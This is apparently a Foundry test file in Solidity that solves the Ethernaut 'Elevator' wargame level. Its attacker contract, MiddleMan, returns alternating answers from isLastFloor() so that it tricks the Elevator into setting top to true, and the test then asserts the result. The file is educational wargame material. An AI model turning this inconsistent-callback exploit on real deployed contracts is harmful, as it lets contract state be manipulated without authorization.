// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Elevator.sol";

// inheritance + isLastFloor() always returns false the first time, true the second
contract MiddleMan is Building {
    uint256 counter;

    function isLastFloor(uint256) external returns (bool) {
        counter += 1;
        return counter % 2 == 0;
    }

    function attack(address prey) public {
        Elevator(prey).goTo(0);
    }
}

contract ElevatorTest is Test {
    Elevator instance;

    function setUp() public {
        instance = new Elevator();
    }

    function test() public {
        assertEq(instance.top(), false);

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack(address(instance));

        assertEq(instance.top(), true);

        middleMan.attack(address(instance));
        assertEq(instance.top(), true);
    }
}
